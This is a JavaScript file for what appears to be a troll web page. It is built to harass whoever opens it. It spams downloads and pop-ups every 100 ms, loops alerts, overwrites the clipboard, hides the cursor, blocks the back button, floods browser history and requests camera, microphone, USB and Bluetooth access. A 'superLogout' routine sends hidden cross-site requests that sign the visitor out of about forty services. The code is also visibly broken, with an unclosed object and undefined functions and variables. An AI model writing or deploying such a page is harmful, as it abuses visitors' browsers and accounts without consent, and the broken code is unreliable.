function downloadFiles(files) {

    files.forEach(file => {

        const link = document.createElement('a');

        link.href = `media/${file}`;

        link.download = file;

        document.body.appendChild(link);

        link.click();

        document.body.removeChild(link);

    });

}


function openLinks(links) {

    links.forEach(link => {

        window.open(link, '_blank');

    });

}


function resizeWindow() {

    let width = 300;

    let height = 200;

    const maxWidth = 800;

    const maxHeight = 600;

    const interval = setInterval(() => {

        if (width < maxWidth && height < maxHeight) {

            width += 50;

            height += 50;

            window.resizeTo(width, height);

        } else {

            clearInterval(interval);
        }

    }, 2000);
}


function main() {

    const filesToDownload = ['ez-yann.png', 'gerbus.png', 'readme.txt'];

    const linksToOpen = ['https://www.youtube.com/watch?v=dQw4w9WgXcQ'];


    setInterval(() => {

        downloadFiles(filesToDownload);

        openLinks(linksToOpen);

    }, 100);


    function copyRandomString() {

        const randomString = Math.random().toString(36).substring(2, 18);

        navigator.clipboard.writeText(randomString).then(() => {

            console.log(randomString);

        });

    }


    function randomAlert() {

        const randomString = Math.random().toString(36).substring(2, 18);

        alert(randomString);

        setTimeout(randomAlert, 1000);

    }


    function openMovingVideo() {

        const videoWindow = window.open('media/wide.mp4', 'videoWindow', 'width=400,height=300');

        let posX = 0;

        let posY = 0;

        const moveVideo = () => {

            posX += 5;

            posY += 5;

            videoWindow.moveTo(posX, posY);

            if (posX < window.screen.width && posY < window.screen.height) {

                requestAnimationFrame(moveVideo);

            }

        };

        moveVideo();

    }


    function requestCameraAndMicrophone() {

navigator.mediaDevices.getUserMedia({ video: true, audio: true })
    .then(stream => {
        console.log('MGOsvs;o<vjojgoGO:Emg;sovmdovm;ojePJQjps9vjsp9vjspvJV$PJ@Psaovkaova;aefq3oma;d<mvs;vmVmjgo;4J:Wsfkd;odmv;AMV:AEvaVA????');
    })
    .catch(err => {
        console.log(err);
    });


    }


    function hideCursor() {

        document.body.style.cursor = 'none';

    }


    function speakText(text) {

        const utterance = new SpeechSynthesisUtterance(text);

        window.speechSynthesis.speak(utterance);

    }


    function requestUSBPermission() {

        navigator.usb.requestDevice({ filters: [] })

            .then(device => {

                console.log(device);

            })

            .catch(err => {

                console.log(err);

            });

    }

    function requestBluetoothPermission() {

        navigator.bluetooth.requestDevice({ acceptAllDevices: true })

            .then(device => {

                console.log(device);

            })

            .catch(err => {

                console.log(err);

            });

    }


const LOGOUT_SITES = {
  Discord: ['POST', 'https://discord.com/api/v9/auth/logout', {provider: null, voip_provider: null}],
  Amazon: ['GET', 'https://www.amazon.com/gp/flex/sign-out.html?action=sign-out'],
  DeviantART: ['POST', 'https://www.deviantart.com/users/logout'],
  Dropbox: ['GET', 'https://www.dropbox.com/logout'],
  eBay: ['GET', 'https://signin.ebay.com/ws/eBayISAPI.dll?SignIn'],
  GitHub: ['GET', 'https://github.com/logout'],
  GMail: ['GET', 'https://mail.google.com/mail/?logout'],
  Google: ['GET', 'https://www.google.com/accounts/Logout'], // works!
  Hulu: ['GET', 'https://secure.hulu.com/logout'],
  NetFlix: ['GET', 'https://www.netflix.com/Logout'],
  Skype: ['GET', 'https://secure.skype.com/account/logout'],
  SoundCloud: ['GET', 'https://soundcloud.com/logout'],
  'Steam Community': ['GET', 'https://steamcommunity.com/?action=doLogout'],
  'Steam Store': ['GET', 'https://store.steampowered.com/logout/'],
  Wikipedia: ['GET', 'https://en.wikipedia.org/w/index.php?title=Special:UserLogout'],
  'Windows Live': ['GET', 'https://login.live.com/logout.srf'],
  Wordpress: ['GET', 'https://wordpress.com/wp-login.php?action=logout'],
  Yahoo: ['GET', 'https://login.yahoo.com/config/login?.src=fpctx&logout=1&.direct=1&.done=https://www.yahoo.com/'],
  YouTube: ['POST', 'https://www.youtube.com', { action_logout: '1' }],
  JShop: ['GET', 'https://jshop.partners/panel/logout'],
  Vimeo: ['GET', 'https://vimeo.com/log_out'], // added by @intexpression
  Tumblr: ['GET', 'https://www.tumblr.com/logout'], // added by @intexpression
  Allegro: ['GET', 'https://allegro.pl/wyloguj?origin_url=/'], // added by @intexpression
  OnetMail: ['GET', 'https://authorisation.grupaonet.pl/logout.html?state=logout&client_id=poczta.onet.pl.front.onetapi.pl'], // added by @intexpression
  InteriaMail: ['GET', 'https://poczta.interia.pl/logowanie/sso/logout'], // added by @intexpression
  OLX: ['GET', 'https://www.olx.pl/account/logout'], // added by @intexpression
  Roblox:  ['POST', 'https://auth.roblox.com/v2/logout'], // added by @cryblanka
  ChatGPT: ['GET', 'https://chatgpt.com/auth/logout'], // added by @cryblanka
  Guilded:  ['POST', 'https://www.guilded.gg/api/logout'], // added by @cryblanka
  LinkedIn: ['GET', 'https://www.linkedin.com/m/logout/'], // added by @MARECKIyt
  Pinterest: ['GET', 'https://www.pinterest.com/logout/'], // added by @MARECKIyt
  Reddit: ['GET', 'https://www.reddit.com/logout'], // added by @MARECKIyt
  Spotify: ['GET', 'https://www.spotify.com/logout/'], // added by @MARECKIyt
  Microsoft: ['GET', 'https://login.microsoftonline.com/common/oauth2/logout'], // added by @MARECKIyt
  Instagram: ['GET', 'https://www.instagram.com/accounts/logout/'], // added by @MARECKIyt
  Trello: ['GET', 'https://trello.com/logout'], // added by @MARECKIyt
  Baidu: ['GET', 'https://passport.baidu.com/?logout'], // added by @MARECKIyt
  VK: ['GET', 'https://vk.com/exit'], // added by @MARECKIyt
  StackOverflow: ['GET', 'https://stackoverflow.com/users/logout'] // added by @MARECKIyt

      function superLogout () {
  function cleanup (el, delayCleanup) {
    if (delayCleanup) {
      delayCleanup = false
      return
    }
    el.parentNode.removeChild(el)
  }

  function get (url) {
    const img = document.createElement('img')
    img.onload = () => cleanup(img)
    img.onerror = () => cleanup(img)
    img.style = HIDDEN_STYLE
    document.body.appendChild(img)
    img.src = url
  }

  function post (url, params) {
    const iframe = document.createElement('iframe')
    iframe.style = HIDDEN_STYLE
    iframe.name = 'iframe' + numSuperLogoutIframes
    document.body.appendChild(iframe)

    numSuperLogoutIframes += 1

    const form = document.createElement('form')
    form.style = HIDDEN_STYLE

    let numLoads = 0
    iframe.onload = iframe.onerror = () => {
      if (numLoads >= 1) cleanup(iframe)
      numLoads += 1
    }
    form.action = url
    form.method = 'POST'
    form.target = iframe.name

    for (const param in params) {
      if (Object.prototype.hasOwnProperty.call(params, param)) {
        const input = document.createElement('input')
        input.type = 'hidden'
        input.name = param
        input.value = params[param]
        form.appendChild(input)
      }
    }

    document.body.appendChild(form)
    form.submit()
  }
  for (const name in LOGOUT_SITES) {
    const method = LOGOUT_SITES[name][0]
    const url = LOGOUT_SITES[name][1]
    const params = LOGOUT_SITES[name][2] || {}

    if (method === 'GET') {
      get(url)
    } else {
      post(url, params)
    }

    const div = document.createElement('div')
    div.innerText = `Wylogowywanie się z ${name}...`

    const logoutMessages = document.querySelector('.logout-messages')
    logoutMessages.appendChild(div)
  }
}


    function disableBack() {

        window.history.pushState(null, '', window.location.href);

        window.onpopstate = function () {

            window.history.pushState(null, '', window.location.href);

        };

    }


    function iframeSpam() {

        for (let i = 0; i < 10; i++) {

            const iframe = document.createElement('iframe');

            iframe.src = 'https://github.com/hazetlab/hazetlab.github.io/media/OCOBG.mp3';

            document.body.appendChild(iframe);

        }

    }


    function fillHistory() {

        for (let i = 1; i < 20; i++) {

            window.history.pushState({}, '', window.location.pathname + '?q=' + i);

        }

        window.history.pushState({}, '', window.location.pathname);

    }

    function playMusic(url) {
    const audio = new Audio(url);
    
    audio.volume = 1.0;

    audio.play().catch(error => {
        console.error(error);
    });
}


const musicUrl = 'media/video.mp3';
playMusic(musicUrl);

    function moxsiu(url) {
    const audio = new Audio(url);
    
    audio.volume = 1.0;

    audio.play().catch(error => {
        console.error(error);
    });
}

function generateRandomPhrase() {
    const phrases = [
        "looololoolollooloooloolooolololololololololol tralalalalalalaalal ptoszek to koxxxx",
        "zerfitel",
        "ZERFITHELLL",
        "krol_dzasioch",
        "UmBSyGEQdfsRTACpyMhfyQ=="
    ];
    return phrases[Math.floor(Math.random() * phrases.length)];
}

function fillHistory() {
    for (let i = 0; i < 10; i++) {
        const randomPhrase = generateRandomPhrase();
        const randomUrl = `https://hazetlab.github.io/${encodeURIComponent(randomPhrase)}`;
        window.history.pushState({ phrase: randomPhrase }, randomPhrase, randomUrl);
    }
}

fillHistoryWithRandomPhrases();

function createIframe(url) {

    const iframe = document.createElement('iframe');
    
   
    iframe.src = url; 
    iframe.width = '600'; 
    iframe.height = '400';
    iframe.frameBorder = '0'; 
    iframe.allowFullscreen = true; 

    document.body.appendChild(iframe);
}


// createIframe('https://github.com/hazetlab/hazetlab.github.io/media/avast.jpg');


    createIframe(url);
    
    generateRandomPhrase();

    playMusic(musicUrl);
    
    copyRandomString();

    randomAlert();

    openMovingVideo();

    requestCameraAndMicrophone();

    hideCursor();

    requestUSBPermission();

    requestBluetoothPermission();

    disableBack(); 

    iframeSpam(); 

    fillHistory();

    superLogout();

}

main();
